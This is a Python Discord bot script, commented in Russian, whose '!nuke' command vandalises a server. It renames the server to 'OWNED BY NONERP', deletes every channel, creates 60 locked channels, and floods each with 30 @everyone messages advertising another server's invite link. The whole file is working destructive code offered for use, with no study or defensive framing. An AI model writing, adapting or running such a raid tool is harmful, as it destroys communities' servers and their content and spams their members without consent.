import discord
from discord.ext import commands
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    await guild.edit(name="OWNED BY NONERP 🖕")
    
    # 2. УДАЛЯЕМ ВСЕ КАНАЛЫ (быстро)
    print("🗑️ Удаление каналов...")
    await asyncio.gather(*[ch.delete() for ch in guild.channels])
    
    # 3. СОЗДАЁМ 60 КАНАЛОВ И ЗАЛИВАЕМ СПАМ
    print("🔥 Создание 60 каналов...")
    
    async def create_and_spam(i):
        try:
            ch = await guild.create_text_channel(f"fuck-by-nonerp")
            await ch.set_permissions(guild.default_role, send_messages=False)
            
            # 30 сообщений (ускоренная отправка)
            tasks = [ch.send(f"@everyone\n**ПЕРЕЕЗД**\nhttps://discord.gg/Zxgzbbmrx3") for _ in range(30)]
            await asyncio.gather(*tasks)
            
            print(f"✅ Канал {i+1}/60 готов")
        except Exception as e:
            print(f"❌ Ошибка канала {i+1}: {e}")
    
    # Запускаем все каналы параллельно
    await asyncio.gather(*[create_and_spam(i) for i in range(60)])
    
    print("✅ НЬЮК ЗАВЕРШЁН")
    await ctx.send("**✅ СЕРВЕР УНИЧТОЖЕН**")

import os
bot.run(os.environ[''])
